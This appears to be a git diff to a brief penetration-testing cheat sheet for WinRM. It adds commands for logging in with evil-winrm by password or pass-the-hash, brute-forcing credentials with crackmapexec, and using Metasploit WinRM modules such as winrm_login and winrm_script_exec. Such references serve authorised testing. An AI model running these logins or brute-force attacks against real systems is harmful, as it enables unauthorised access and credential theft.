@@ -1,5 +1,20 @@
+# Pentest WinRM
+# Default Port: 5985,5986
+
+# Login
+evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+evil-winrm -i <IP> -u <USER> -H <HASH>
+
+
+# Bruteforce (CME)
+crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+
+
+# Bruteforce (metasploit)
+msf >use auxiliary/scanner/winrm/winrm_login
+
+# Other WinRM Metasploit Modules
 msf >use exploit/windows/winrm/winrm_script_exec
 msf >use auxiliary/scanner/winrm/winrm_auth_methods
 msf >use auxiliary/scanner/winrm/winrm_cmd
-msf >use auxiliary/scanner/winrm/winrm_login
 msf >use auxiliary/scanner/winrm/winrm_wql
